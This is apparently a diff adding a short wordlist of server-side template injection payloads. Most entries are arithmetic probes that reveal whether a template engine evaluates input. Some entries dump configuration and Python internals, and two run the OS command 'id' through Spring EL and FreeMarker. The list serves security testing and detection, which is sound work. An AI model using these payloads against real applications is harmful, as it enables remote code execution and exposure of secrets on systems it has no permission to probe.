@@ -1,0 +1,16 @@
+# SSTI detection payloads
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+{7*7}
+{{7*'7'}}
+${{7*7}}
+{{config}}
+{{self}}
+{{request}}
+{{''.__class__.__mro__}}
+{{config.__class__.__init__.__globals__}}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+#set($x=7*7)$x
